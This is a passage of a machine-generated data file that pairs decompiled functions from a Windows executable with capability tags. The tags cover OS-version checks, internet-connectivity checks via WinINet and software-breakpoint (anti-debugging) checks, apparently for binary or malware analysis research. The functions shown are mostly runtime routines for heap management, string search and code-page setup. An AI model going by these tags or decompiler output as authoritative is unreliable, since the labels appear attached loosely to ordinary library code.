1;\n    }\n    else {\n        pcStack40 = fcn.0041b5ee;\n        uStack36 = *0x444220;\n        uStack32 = var_20h;\n        puStack28 = var_ch_2;\n        uStack24 = var_1ch;\n        uStack20 = var_18h;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.0041b527::var_28h_2;\n        var_30h = var_8h_3;\n        var_2ch = var_28h;\n        iVar1 = fcn.0041e005(*var_8h_3, &fcn.0041b527::var_30h);\n        (**(iVar1 + 0x74))();\n        var_34h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_34h;\n}\n",
        "token_count": 671
    },
    "0041b5ee": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041b5ee(int32_t param_1, int32_t param_2, uint param_3, uint param_4, uint param_5, uint param_6, uint param_7\n                 , uint param_8)\n\n{\n    uint uVar1;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_retaddr;\n    int32_t arg_20h;\n    int32_t noname_8;\n    code *extraout_var;\n    code *UNRECOVERED_JUMPTABLE;\n    \n    if (*(param_2 + 8) == *0x444220) {\n        if ((*(param_1 + 4) & 0x66) == 0) {\n            noname_8 = 1;\n            arg_20h = *(param_2 + 0x18);\n            fcn.0041ef90(param_1, *(param_2 + 0x10), param_3, 0, *(param_2 + 0xc), *(param_2 + 0x14), arg_20h, 1);\n            UNRECOVERED_JUMPTABLE = extraout_var;\n            if (*(param_2 + 0x24) == 0) {\n                arg_20h = param_2;\n                noname_8 = param_1;\n                fcn.0041b464(param_2, param_1);\n            }\n            fcn.0041b527(0x123, &stack0xfffffff8, 0, 0, 0, 0, 0, arg_20h, noname_8, unaff_EBX, UNRECOVERED_JUMPTABLE, \n                         unaff_EBP, unaff_retaddr, param_1, param_2, param_3, param_4, param_5, param_6, param_7, \n                         param_8);\n    // WARNING: Could not recover jumptable at 0x0041b698. Too many branches\n    // WARNING: Treating indirect jump as call\n            uVar1 = (*UNRECOVERED_JUMPTABLE)();\n            return uVar1;\n        }\n        *(param_2 + 0x24) = 1;\n    }\n    else {\n        *(param_1 + 4) = *(param_1 + 4) | 8;\n    }\n    return 1;\n}\n",
        "token_count": 524
    },
    "0041b6a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041b6a0(uint32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t *arg_14h, uint32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t var_4h;\n    \n    iVar3 = arg_8h;\n    var_4h = *(arg_8h + 0xc);\n    iVar2 = *(arg_8h + 0x10);\n    uVar4 = var_4h;\n    arg_8h = var_4h;\n    if (-1 < arg_ch) {\n        do {\n            if (uVar4 == 0xffffffff) {\n                fcn.0041f067();\n            }\n            uVar4 = uVar4 - 1;\n            iVar1 = iVar2 + uVar4 * 0x14;\n            if (((*(iVar1 + 4) < arg_10h) && (arg_10h <= *(iVar1 + 8))) || (uVar4 == 0xffffffff)) {\n                arg_ch = arg_ch + -1;\n                var_4h = arg_8h;\n                arg_8h = uVar4;\n            }\n        } while (-1 < arg_ch);\n    }\n    uVar4 = uVar4 + 1;\n    *arg_14h = uVar4;\n    *arg_18h = var_4h;\n    if ((*(iVar3 + 0xc) <= var_4h && var_4h != *(iVar3 + 0xc)) || (var_4h < uVar4)) {\n        fcn.0041f067();\n    }\n    return iVar2 + uVar4 * 0x14;\n}\n",
        "token_count": 407
    },
    "0041b763": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.0041b763(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    \n    iVar2 = fcn.0041e005();\n    if (param_1 == *(iVar2 + 0x88)) {\n        iVar2 = fcn.0041e005();\n        *(iVar2 + 0x88) = *(param_1 + 4);\n        return;\n    }\n    iVar2 = fcn.0041e005();\n    iVar2 = *(iVar2 + 0x88);\n    do {\n        iVar3 = iVar2;\n        if (*(iVar3 + 4) == 0) {\n            fcn.0041cd84(0x43af68, 8);\n            pcVar1 = *0x4444c4;\n            if (*0x4444c4 != NULL) {\n                *(unaff_EBP + -4) = 0;\n                (*pcVar1)();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.0041cd84(0x43af58, 8);\n            iVar2 = fcn.0041e005();\n            if (*(iVar2 + 0x6c) != 0) {\n                *(unaff_EBP + -4) = 0;\n                iVar2 = fcn.0041e005();\n                (**(iVar2 + 0x6c))();\n                *(unaff_EBP + -4) = 0xffffffff;\n            }\n            fcn.00420bc8(10);\n            fcn.00425353(0x16);\n            fcn.0041cbfc(3);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n        iVar2 = *(iVar3 + 4);\n    } while (param_1 != *(iVar3 + 4));\n    *(iVar3 + 4) = *(param_1 + 4);\n    return;\n}\n",
        "token_count": 448
    },
    "0041f032": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041f032(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43af58, 8);\n    iVar2 = fcn.0041e005();\n    if (*(iVar2 + 0x6c) != 0) {\n        *(unaff_EBP + -4) = 0;\n        iVar2 = fcn.0041e005();\n        (**(iVar2 + 0x6c))();\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.00420bc8(10);\n    fcn.00425353(0x16);\n    fcn.0041cbfc(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 216
    },
    "0041b99c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b99c(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) == 0) {\n        fcn.0041b8f6(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10), *(unaff_EBP + 0x14));\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "0041b9b4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041b9b4(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t unaff_EBP;\n    uint32_t arg_8h_00;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ad68, 0xc);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if ((*0x44acc0 == 3) && (arg_8h_00 <= *0x44acac)) {\n        fcn.0041f23f(4);\n        *(unaff_EBP + -4) = 0;\n        uVar1 = fcn.0041fb02(arg_8h_00);\n        *(unaff_EBP + -0x1c) = uVar1;\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.0041ba26();\n        if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0041ba1d;\n    }\n    if (arg_8h_00 == 0) {\n        arg_8h_00 = 1;\n    }\n    if (*0x44acc0 != 1) {\n        arg_8h_00 = arg_8h_00 + 0xf & 0xfffffff0;\n    }\n    (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x44acbc, 0, arg_8h_00);\ncode_r0x0041ba1d:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 379
    },
    "0041ba6d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041ba6d(uint arg_8h)\n\n{\n    int32_t arg_8h_00;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    int32_t arg_ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ad78, 0xc);\n    arg_ch = *(unaff_EBP + 8);\n    if (arg_ch != 0) {\n        if (*0x44acc0 == 3) {\n            fcn.0041f23f(4);\n            *(unaff_EBP + -4) = 0;\n            arg_8h_00 = fcn.0041f323(arg_ch);\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 != 0) {\n                fcn.0041f34e(arg_8h_00, arg_ch);\n            }\n            *(unaff_EBP + -4) = 0xffffffff;\n            fcn.0041bac0();\n            if (*(unaff_EBP + -0x1c) != 0) goto code_r0x0041bad8;\n            arg_ch = *(unaff_EBP + 8);\n        }\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x44acbc, 0, arg_ch);\n    }\ncode_r0x0041bad8:\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 348
    },
    "0041bade": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0041bade(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_58h;\n    uint lpSystemInfo;\n    int32_t var_48h;\n    uint32_t lpBuffer;\n    int32_t var_24h;\n    int32_t var_1ch;\n    uint32_t var_18h;\n    uint var_13h;\n    uint lpflOldProtect;\n    int32_t dwSize;\n    uint32_t lpAddress;\n    \n    fcn.0041bcd0();\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(&var_58h, &lpBuffer, 0x1c);\n    if (iVar1 != 0) {\n        (*_sym.imp.KERNEL32.dll_GetSystemInfo)(&lpSystemInfo);\n        uVar4 = (~(var_48h - 1U) & &var_58h) - var_48h;\n        uVar3 = ((-(*0x449638 != 1) & 0xfffffff1) + 0x11) * var_48h + var_24h;\n        dwSize = var_48h;\n        if (uVar3 <= uVar4) {\n            lpAddress = uVar4;\n            if (*0x449638 != 1) {\n                lpAddress = var_24h;\n                do {\n                    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualQuery)(lpAddress, &lpBuffer, 0x1c);\n                    if (iVar1 == 0) {\n                        return 0;\n                    }\n                    lpAddress = lpAddress + var_1ch;\n                } while ((var_18h & 0x1000) == 0);\n                lpAddress = lpBuffer;\n                if ((var_13h & 1) != 0) {\n                    return 1;\n                }\n                if (uVar4 < lpBuffer) {\n                    return 0;\n                }\n                if (lpBuffer < uVar3) {\n                    lpAddress = uVar3;\n                }\n                (*_sym.imp.KERNEL32.dll_VirtualAlloc)(lpAddress, dwSize, 0x1000, 4);\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_VirtualProtect)\n                              (lpAddress, dwSize, (-(*0x449638 != 1) & 0x103) + 1, &lpflOldProtect);\n            return uVar2;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 585
    },
    "0041c79b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t * __cdecl fcn.0041c79b(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    \n    iVar3 = fcn.0041e005();\n    iVar3 = *(iVar3 + 0x60);\n    if (iVar3 != *0x44acc8) {\n        iVar3 = fcn.0041d16e();\n    }\n    if (*(iVar3 + 8) == 0) {\n        uVar7 = arg_8h & 3;\n        while (uVar7 != 0) {\n            if (*arg_8h == arg_ch) {\n                return arg_8h;\n            }\n            if (*arg_8h == 0) {\n                return NULL;\n            }\n            uVar7 = arg_8h + 1 & 3;\n            arg_8h = arg_8h + 1;\n        }\n        while( true ) {\n            while( true ) {\n                uVar7 = *arg_8h;\n                uVar6 = uVar7 ^ CONCAT22(CONCAT11(arg_ch, arg_ch), CONCAT11(arg_ch, arg_ch));\n                uVar4 = uVar7 ^ 0xffffffff ^ uVar7 + 0x7efefeff;\n                puVar5 = arg_8h + 1;\n                if (((uVar6 ^ 0xffffffff ^ uVar6 + 0x7efefeff) & 0x81010100) != 0) break;\n                arg_8h = puVar5;\n                if ((uVar4 & 0x81010100) != 0) {\n                    if ((uVar4 & 0x1010100) != 0) {\n                        return NULL;\n                    }\n                    if ((uVar7 + 0x7efefeff & 0x80000000) == 0) {\n                        return NULL;\n                    }\n                }\n            }\n            uVar7 = *arg_8h;\n            if (uVar7 == arg_ch) {\n                return arg_8h;\n            }\n            if (uVar7 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 8;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 1;\n            }\n            if (uVar2 == 0) break;\n            uVar2 = uVar7 >> 0x10;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 2;\n            }\n            if (uVar2 == 0) {\n                return NULL;\n            }\n            uVar2 = uVar7 >> 0x18;\n            if (uVar2 == arg_ch) {\n                return arg_8h + 3;\n            }\n            arg_8h = puVar5;\n            if (uVar2 == 0) {\n                return NULL;\n            }\n        }\n        return NULL;\n    }\n    while( true ) {\n        uVar2 = *arg_8h;\n        uVar7 = uVar2;\n        if (uVar2 == 0) break;\n        if ((*(uVar7 + 0x1d + iVar3) & 4) == 0) {\n            puVar5 = arg_8h;\n            if (arg_ch == uVar7) break;\n        }\n        else {\n            uVar1 = *(arg_8h + 1);\n            if (uVar1 == 0) {\n                return NULL;\n            }\n            puVar5 = arg_8h + 1;\n            if (arg_ch == CONCAT11(uVar2, uVar1)) {\n                return arg_8h;\n            }\n        }\n        arg_8h = puVar5 + 1;\n    }\n    return ~-(arg_ch != uVar7) & arg_8h;\n}\n",
        "token_count": 885
    },
    "0041c816": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n\nvoid __cdecl fcn.0041c816(uint arg_8h, uint arg_ch)\n\n{\n    int32_t arg_ch_00;\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    uint32_t arg_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0041cd84(0x43ae10, 0x14);\n    arg_ch_00 = *(unaff_EBP + 8);\n    if (arg_ch_00 == 0) {\n        fcn.0041ba5b(*(unaff_EBP + 0xc));\n    }\n    else {\n        arg_10h = *(unaff_EBP + 0xc);\n        if (arg_10h == 0) {\n            fcn.0041ba6d(arg_ch_00);\n        }\n        else if (*0x44acc0 == 3) {\n            do {\n                *(unaff_EBP + -0x1c) = 0;\n                if (arg_10h < 0xffffffe1) {\n                    fcn.0041f23f(4);\n                    *(unaff_EBP + -4) = 0;\n                    iVar1 = fcn.0041f323(arg_ch_00);\n                    *(unaff_EBP + -0x20) = iVar1;\n                    if (iVar1 != 0) {\n                        if (arg_10h <= *0x44acac) {\n                            iVar1 = fcn.0041f823(iVar1, arg_ch_00, arg_10h);\n                            if (iVar1 == 0) {\n                                iVar1 = fcn.0041fb02(arg_10h);\n                                *(unaff_EBP + -0x1c) = iVar1;\n                                if (iVar1 != 0) {\n                                    uVar2 = *(arg_ch_00 + -4) - 1;\n                                    *(unaff_EBP + -0x24) = uVar2;\n                                    if (arg_10h <= uVar2) {\n                                        uVar2 = arg_10h;\n                                    }\n                                    fcn.0041c370(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                    uVar3 = fcn.0041f323(arg_ch_00);\n                                    *(unaff_EBP + -0x20) = uVar3;\n                                    fcn.0041f34e(uVar3, arg_ch_00);\n                                }\n                            }\n                            else {\n                                *(unaff_EBP + -0x1c) = arg_ch_00;\n                            }\n                        }\n                        if (*(unaff_EBP + -0x1c) == 0) {\n                            if (arg_10h == 0) {\n                                arg_10h = 1;\n                                *(unaff_EBP + 0xc) = 1;\n                            }\n                            arg_10h = arg_10h + 0xf & 0xfffffff0;\n                            *(unaff_EBP + 0xc) = arg_10h;\n                            iVar1 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(*0x44acbc, 0, arg_10h);\n                            *(unaff_EBP + -0x1c) = iVar1;\n                            if (iVar1 != 0) {\n                                uVar2 = *(arg_ch_00 + -4) - 1;\n                                *(unaff_EBP + -0x24) = uVar2;\n                                if (arg_10h <= uVar2) {\n                                    uVar2 = arg_10h;\n                                }\n                                fcn.0041c370(*(unaff_EBP + -0x1c), arg_ch_00, uVar2);\n                                fcn.0041f34e(*(unaff_EBP + -0x20), arg_ch_00);\n                            }\n                        }\n                    }\n                    *(unaff_EBP + -4) = 0xffffffff;\n                    fcn.0041c97e();\n                    if (*(unaff_EBP + -0x20) == 0) {\n                        if (arg_10h == 0) {\n                            arg_10h = 1;\n                        }\n                        arg_10h = arg_10h + 0xf & 0xfffffff0;\n                        *(unaff_EBP + 0xc) = arg_10h;\n                        uVar3 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x44acbc, 0, arg_ch_00, arg_10h);\n                        *(unaff_EBP + -0x1c) = uVar3;\n                    }\n                }\n            } while (((*(unaff_EBP + -0x1c) == 0) && (*0x4497f4 != 0)) && (iVar1 = fcn.0041fdfe(arg_10h),  iVar1 != 0));\n        }\n        else {\n            do {\n                iVar1 = 0;\n                if (arg_10h < 0xffffffe1) {\n                    if (arg_10h == 0) {\n                        arg_10h = 1;\n                    }\n                    iVar1 = (*_sym.imp.KERNEL32.dll_HeapReAlloc)(*0x44acbc, 0, arg_ch_00, arg_10h);\n                }\n            } while (((iVar1 == 0) && (*0x4497f4 != 0)) && (iVar1 = fcn.0041fdfe(arg_10h),  iVar1 != 0));\n        }\n    }\n    fcn.0041cdbf();\n    return;\n}\n",
        "token_count": 1273
    },
    "0041cfe2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_518h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041cfe2(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar uVar4;\n    char cVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    uint unaff_ESI;\n    uint *puVar9;\n    uint noname_8;\n    uint noname_9;\n    uint *noname_2;\n    uint noname_11;\n    uint *noname_4;\n    uint noname_13;\n    uint noname_14;\n    uint noname_15;\n    uint noname_8_00;\n    uint *noname_1;\n    uint noname_10;\n    uint noname_12;\n    uint noname_13_00;\n    uint noname_14_00;\n    uint noname_7;\n    uint *arg_8h;\n    uint var_518h;\n    uint in_stack_fffffae8;\n    uint in_stack_fffffaec;\n    uint in_stack_fffffaf0;\n    uint in_stack_fffffaf4;\n    uint in_stack_fffffaf8;\n    uint in_stack_fffffafc;\n    uint in_stack_fffffb00;\n    uint in_stack_fffffb04;\n    uint var_318h;\n    uint var_218h;\n    uint var_118h;\n    uint lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    arg_8h = &lpCPInfo;\n    noname_7 = *0x44ade4;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetCPInfo)();\n    if (iVar2 == 1) {\n        uVar3 = 0;\n        do {\n            *(&var_118h + uVar3) = uVar3;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n        var_118h._0_1_ = 0x20;\n        if (var_12h != 0) {\n            puVar8 = &var_12h + 1;\n            do {\n                uVar3 = var_12h;\n                if (uVar3 <= *puVar8) {\n                    uVar6 = (*puVar8 - uVar3) + 1;\n                    puVar9 = &var_118h + uVar3;\n                    for (uVar7 = uVar6 >> 2; uVar7 != 0; uVar7 = uVar7 - 1) {\n                        *puVar9 = 0x20202020;\n                        puVar9 = puVar9 + 1;\n                    }\n                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar9 = 0x20;\n                        puVar9 = puVar9 + 1;\n                    }\n                }\n                var_12h._0_1_ = puVar8[1];\n                puVar8 = puVar8 + 2;\n            } while (var_12h != 0);\n        }\n        noname_14_00 = 0;\n        puVar9 = &var_518h;\n        noname_10 = 0x100;\n        noname_1 = &var_118h;\n        noname_8_00 = 1;\n        noname_12 = *0x44ade4;\n        noname_13_00 = *0x44acc4;\n        fcn.00422a4a(1, noname_1, 0x100, puVar9, *0x44ade4, *0x44acc4, 0, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4);\n        noname_15 = 0;\n        noname_4 = &var_218h;\n        noname_13 = 0x100;\n        noname_11 = 0x100;\n        noname_2 = &var_118h;\n        noname_9 = 0x100;\n        noname_8 = *0x44acc4;\n        noname_14 = *0x44ade4;\n        fcn.0041e336(*0x44acc4, 0x100, noname_2, 0x100, noname_4, 0x100, *0x44ade4, 0, noname_8_00, noname_1, noname_10\n                     , puVar9, noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h, \n                     in_stack_fffffae8, in_stack_fffffaec, in_stack_fffffaf0, in_stack_fffffaf4, in_stack_fffffaf8, \n                     in_stack_fffffafc, in_stack_fffffb00, in_stack_fffffb04);\n        fcn.0041e336(*0x44acc4, 0x200, &var_118h, 0x100, &var_318h, 0x100, *0x44ade4, 0, noname_8, noname_9, noname_2, \n                     noname_11, noname_4, noname_13, noname_14, noname_15, noname_8_00, noname_1, noname_10, puVar9, \n                     noname_12, noname_13_00, noname_14_00, noname_7, arg_8h, unaff_ESI, var_518h);\n        uVar3 = 0;\n        do {\n            uVar1 = *(&var_518h + uVar3 * 2);\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 & 2) != 0) {\n                    *(uVar3 + 0x44ace1) = *(uVar3 + 0x44ace1) | 0x20;\n                    uVar4 = *(&var_318h + uVar3);\n                    goto code_r0x0041d0f4;\n                }\n                *(uVar3 + 0x44ae00) = 0;\n            }\n            else {\n                *(uVar3 + 0x44ace1) = *(uVar3 + 0x44ace1) | 0x10;\n                uVar4 = *(&var_218h + uVar3);\ncode_r0x0041d0f4:\n                *(uVar3 + 0x44ae00) = uVar4;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    else {\n        uVar3 = 0;\n        do {\n            if ((uVar3 < 0x41) || (0x5a < uVar3)) {\n                if ((0x60 < uVar3) && (uVar3 < 0x7b)) {\n                    *(uVar3 + 0x44ace1) = *(uVar3 + 0x44ace1) | 0x20;\n                    cVar5 = uVar3 + -0x20;\n                    goto code_r0x0041d137;\n                }\n                *(uVar3 + 0x44ae00) = 0;\n            }\n            else {\n                *(uVar3 + 0x44ace1) = *(uVar3 + 0x44ace1) | 0x10;\n                cVar5 = uVar3 + ' ';\ncode_r0x0041d137:\n                *(uVar3 + 0x44ae00) = cVar5;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    fcn.0041c6de();\n    return;\n}\n",
        "token_count": 1842
    },
    "0041d1dd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041d1dd(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    uint extraout_ECX_00;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    uint8_t *puVar7;\n    uint *puVar8;\n    uint32_t var_1ch;\n    uint32_t lpCPInfo;\n    uint var_12h;\n    uint var_4h;\n    \n    var_4h = *0x444220;\n    if (arg_8h != 0) {\n        iVar5 = 0;\n        uVar3 = 0;\ncode_r0x0041d1ff:\n        if (*(uVar3 + 0x444258) != arg_8h) goto code_r0x0041d207;\n        puVar8 = 0x44ace0;\n        for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar8 = 0;\n            puVar8 = puVar8 + 1;\n        }\n        var_1ch = 0;\n        *puVar8 = 0;\n        puVar6 = iVar5 * 0x30 + 0x444268;\n        do {\n            uVar2 = *puVar6;\n            puVar7 = puVar6;\n            while ((uVar2 != 0 && (uVar1 = puVar7[1],  uVar1 != 0))) {\n                uVar3 = uVar2;\n                if (uVar3 <= uVar1) {\n                    uVar2 = *(var_1ch + 0x444250);\n                    do {\n                        *(uVar3 + 0x44ace1) = *(uVar3 + 0x44ace1) | uVar2;\n                        uVar3 = uVar3 + 1;\n                    } while (uVar3 <= uVar1);\n                }\n                puVar7 = puVar7 + 2;\n                uVar2 = *puVar7;\n            }\n            var_1ch = var_1ch + 1;\n            puVar6 = puVar6 + 8;\n        } while (var_1ch < 4);\n        *0x44ade4 = arg_8h;\n        *0x44accc = 1;\n        *0x44acc4 = fcn.0041cf8a();\n        *0x44adf0 = *(extraout_ECX + 0x44425c);\n        *0x44adf4 = *(extraout_ECX + 0x444260);\n        *0x44adf8 = *(extraout_ECX + 0x444264);\n        goto code_r0x0041d354;\n    }\ncode_r0x0041d34f:\n    fcn.0041cfb9();\ncode_r0x0041d354:\n    fcn.0041cfe2();\ncode_r0x0041d360:\n    fcn.0041c6de();\n    return;\ncode_r0x0041d207:\n    uVar3 = uVar3 + 0x30;\n    iVar5 = iVar5 + 1;\n    if (0xef < uVar3) goto code_r0x0041d212;\n    goto code_r0x0041d1ff;\ncode_r0x0041d212:\n    iVar5 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(arg_8h, &lpCPInfo);\n    if (iVar5 != 1) {\n        if (*0x449688 == 0) goto code_r0x0041d360;\n        goto code_r0x0041d34f;\n    }\n    puVar8 = 0x44ace0;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar8 = 0;\n        puVar8 = puVar8 + 1;\n    }\n    *puVar8 = 0;\n    *0x44ade4 = arg_8h;\n    *0x44acc4 = 0;\n    if (lpCPInfo < 2) {\n        *0x44accc = 0;\n    }\n    else {\n        if (var_12h != '\\0') 